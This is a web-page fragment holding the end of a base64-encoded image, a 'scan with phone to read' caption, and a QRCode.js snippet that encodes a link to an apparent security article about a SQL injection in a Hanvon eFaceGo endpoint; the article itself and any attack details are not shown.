qoixAdgs/mre95eeH1hnhKb4Lb95Cazn71/UGeBgiufHvAmIORm+sIyal7H5jr+o8QxloIt6bfS10883vOPOQ+cnPiTL/eEE/nTXD5PaTvz2mKkOn3HIy6eXNyGHP6z6J9xBnaSw9yT7m+2HU5pA6CqzzEh6A5CIdzvN4QT+1N8OmBwDhd9+9TtOKQOn0I73X66pCcugijDuGAkdtfRoM717C3/AyBW6+e631gnrPOvNh1eeHTA6nwtf79CRwGApk2BPsWnLKoL4ev1VkvwlgP4fYXze8Rkt1rs2tIDoKzTGn9XnJIHQTVxaqtJYfkIFjefpkrPAxkH7yuf/4EtoFApldT2q++JUiu63JrO4exDh7z3geSh2Dvb75QD5KFoHplaskhPszR3LNYvWtB+tV1LevrupZ8j9tA9uJ1/boTOAwEMlUIurWa6H7B6MPIzcKoQ3j35d6vo74I6QN3tMbMikNq9EXrVghjnTmIDkH7dTTfdUgdcP0fdj7e7GP7XVbf19k0z/KQqZuznwijDyPvdRAfgvp7hHgQ9F77TF2ri6XtF6QeRjSzqtOH1K141+1XePhXluELX3MC2++yajr7tdrOPlPXkKcBRiyvln1g9NUrU0veEVJXmVr6db1aZiC1EOy63D4w5rpvTh3GvH7Hs7x+4fWG1Cm80dq+h0CmDc9h/xr6UwHp03Ny85CcXOw5eUdIPdCtja96ArffVUFwK2gXMPd7X8tgnn/Gv94QT+lNcBuI0z7D1b7h8VNhX+sh+a53H5JT72h94crr+opXj/3qOcheYMSes8eZDmMf4PpzyMebfWxviPuC49QA7SX6VAC3fy/LLYBRX/mQnHU9pw7JwRHNiJCMXDzr3X15R/tB7gMjdl8u7vsdBmLowtecwF8PxOlCnorVl2FOH5KHoPoqp9/RfKFeXdfqHHIvCOp3rNpakFxd1zIH0SFY3n6ZE/XkchHSB7i+h3y82cdfvyHPfj2Qp6DnfUpESE7e851D8nD8j/DD3YO1770gee+x0vVFmNfpd4R5vu73YwPpm7r4/AQOA6kpzda8/K5ac1ceX5mHPC0QVO/VMPfNF0IyECytlr0gury8WhC9rmtBOATNw8grW0v/qwhjv6o/DKTEa73uBLaBQKYFj3G1VUidPoTXE7RfK7/rctEekL7qjxCStbbjo9qZt6pX7zXqMO6j5yA+cP2U9fFmH9sb8mb7+r/dzv8AAAD//+ma0/oAAAAGSURBVAMAcdKzsO9lAz4AAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-queryFeedBackRecords-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 